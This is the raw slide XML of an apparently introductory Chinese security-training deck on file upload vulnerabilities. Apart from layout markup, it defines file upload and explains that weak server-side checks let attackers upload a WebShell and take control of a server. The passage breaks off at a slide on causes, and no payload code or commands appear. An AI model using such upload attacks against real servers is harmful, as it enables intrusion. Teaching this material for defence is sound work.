              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>单击此处添加幻灯片章节标题</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="文本占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr userDrawn="1">
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3078333" y="4327286"/>
            <a:ext cx="6039972" cy="443643"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="ctr" anchorCtr="1">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="9" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="6248400"/>
            <a:ext cx="12192000" cy="609600"/>
            <a:chOff x="0" y="6248400"/>
            <a:chExt cx="12192000" cy="609600"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="6248400"/>
              <a:ext cx="12192000" cy="609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dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="Rectangle 12"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="6248400"/>
              <a:ext cx="152400" cy="609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sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="0"/>
            <a:ext cx="10850563" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="394479"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>单击此处编辑母版标题样式</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="日期占位符 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="灯片编号占位符 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9326898" y="5979924"/>
            <a:ext cx="2909888" cy="206381"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="2800" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                    <a:lumOff val="5000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="Group 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="669925" y="1028700"/>
            <a:ext cx="10850563" cy="45719"/>
            <a:chOff x="0" y="990600"/>
            <a:chExt cx="12192001" cy="45719"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="C4251F"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="990600"/>
              <a:ext cx="11811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16" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11623040" y="990600"/>
              <a:ext cx="568961"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4482" y="6206331"/>
            <a:ext cx="963524" cy="693737"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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99426" y="6235700"/>
            <a:ext cx="622300" cy="622300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="1123950"/>
            <a:ext cx="10850563" cy="5019675"/>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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="9" name="Group 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="0" y="6248400"/>
            <a:ext cx="12192000" cy="609600"/>
            <a:chOff x="0" y="6248400"/>
            <a:chExt cx="12192000" cy="609600"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="002060"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="Rectangle 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="6248400"/>
              <a:ext cx="12192000" cy="609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dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13" name="Rectangle 12"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="6248400"/>
              <a:ext cx="152400" cy="609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sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="0"/>
            <a:ext cx="10850563" cy="1028700"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="394479"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>单击此处编辑母版标题样式</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="日期占位符 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="14" name="Group 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="669925" y="1028700"/>
            <a:ext cx="10850563" cy="45719"/>
            <a:chOff x="0" y="990600"/>
            <a:chExt cx="12192001" cy="45719"/>
          </a:xfrm>
          <a:solidFill>
            <a:srgbClr val="C4251F"/>
          </a:solidFill>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="15" name="Rectangle 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="990600"/>
              <a:ext cx="11811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16" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="11623040" y="990600"/>
              <a:ext cx="568961"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4482" y="6206331"/>
            <a:ext cx="963524" cy="693737"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>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99426" y="6235700"/>
            <a:ext cx="622300" cy="622300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="灯片编号占位符 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9344482" y="6006300"/>
            <a:ext cx="2909888" cy="206381"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="1800" b="1"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="11" name="图片 1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608391" y="6235700"/>
            <a:ext cx="2132315" cy="658019"/>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alphaModFix amt="10000"/>
            <a:extLst>
              <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
              </a:ext>
            </a:extLst>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="-1"/>
            <a:ext cx="12192000" cy="6858001"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ctrTitle" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="3456451"/>
            <a:ext cx="10850563" cy="869854"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buNone/>
              <a:defRPr sz="3200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>结束语</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="文本占位符 62"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="17" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="4406734"/>
            <a:ext cx="10850563" cy="310871"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr lang="zh-CN" altLang="en-US" sz="1200" smtClean="0">
                <a:solidFill>
                  <a:schemeClr val="accent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zh-CN" altLang="en-US" dirty="0"/>
              <a:t>署名</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="文本占位符 62"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="18" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669924" y="4722368"/>
            <a:ext cx="10850563" cy="310871"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0" algn="ctr">
              <a:buNone/>
              <a:defRPr lang="zh-CN" altLang="en-US" sz="12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zh-CN" altLang="en-US" dirty="0"/>
              <a:t>时间日期</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="6" name="Group 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="5400000">
            <a:off x="10442716" y="202243"/>
            <a:ext cx="69568" cy="3429000"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="381000" cy="3429000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="7" name="Rectangle 6"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="3429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8" name="Rectangle 7"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="381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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="12" name="Group 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr userDrawn="1"/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm rot="16200000">
            <a:off x="1679716" y="202243"/>
            <a:ext cx="69568" cy="3429000"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="381000" cy="3429000"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="16" name="Rectangle 15"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="3429000"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:solidFill>
              <a:srgbClr val="002060"/>
            </a:solidFill>
            <a:ln>
              <a:solidFill>
                <a:srgbClr val="006C3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17" name="Rectangle 16"/>
            <p:cNvSpPr/>
            <p:nvPr userDrawn="1"/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="0" y="0"/>
              <a:ext cx="381000" cy="381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90465" y="1123950"/>
            <a:ext cx="1553273" cy="1553273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="18" name="图片 1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768591" y="1140104"/>
            <a:ext cx="2157323" cy="1553273"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="20" name="图片 19"/>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40996" y="1077943"/>
            <a:ext cx="1677597" cy="1677597"/>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7F69DF-D574-4037-B6A5-58CCD724C69D}"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5401732" y="6235700"/>
            <a:ext cx="1388536" cy="206381"/>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669924" y="6235700"/>
            <a:ext cx="4140201" cy="20638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nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8610599" y="6235700"/>
            <a:ext cx="2909888" cy="206381"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r">
              <a:defRPr sz="1000">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:tint val="75000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>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9.web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013835" y="2758440"/>
            <a:ext cx="4713605" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="5400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:effectLst>
                  <a:outerShdw blurRad="38100" dist="19050" dir="2700000" algn="tl" rotWithShape="0">
                    <a:schemeClr val="dk1">
                      <a:alpha val="40000"/>
                    </a:schemeClr>
                  </a:outerShdw>
                </a:effectLst>
              </a:rPr>
              <a:t>文件上传漏洞</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="5400" b="1" dirty="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文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>入门</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="1386205"/>
            <a:ext cx="2570480"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>什么是文件上传？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="3352165"/>
            <a:ext cx="3107690"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>什么是文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>漏洞？</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
              <a:solidFill>
                <a:schemeClr val="bg1"/>
              </a:solidFill>
              <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1198880" y="2204085"/>
            <a:ext cx="9366885" cy="645160"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>       </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件上传指的是将文件从个人计算机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>本地计算机</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>发送到远程服务器上的功能。很多</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用都提供了功能，通常用户会以</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>请求方式把文件内容进行</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>上传。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="文本框 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1198880" y="4227830"/>
            <a:ext cx="9367520" cy="1229995"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>文件上传漏洞是一种常见的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>Web</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>应用程序漏洞。这类漏洞的产生通常是因为服务器没有对用户上传的文件进行充分的安全检查和验证。攻击者便可能上传恶意的可执行文件（如</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>WebShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>，通常是一句话木马），并在服务器上执行该文件，从而获得服务器的控制权（即</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" dirty="0"/>
              <a:t>GetShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" dirty="0"/>
              <a:t>）。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>只要具有文件上传功能的地方都有可能存在文件上传漏洞。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000" b="1"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文件上传</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>入门</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="灯片编号占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{5DD3DB80-B894-403A-B48E-6FDC1A72010E}" type="slidenum">
              <a:rPr lang="zh-CN" altLang="en-US" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="zh-CN" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="669925" y="1503045"/>
            <a:ext cx="4246880"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zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>产生文件上传漏洞的</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2400" b="1">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
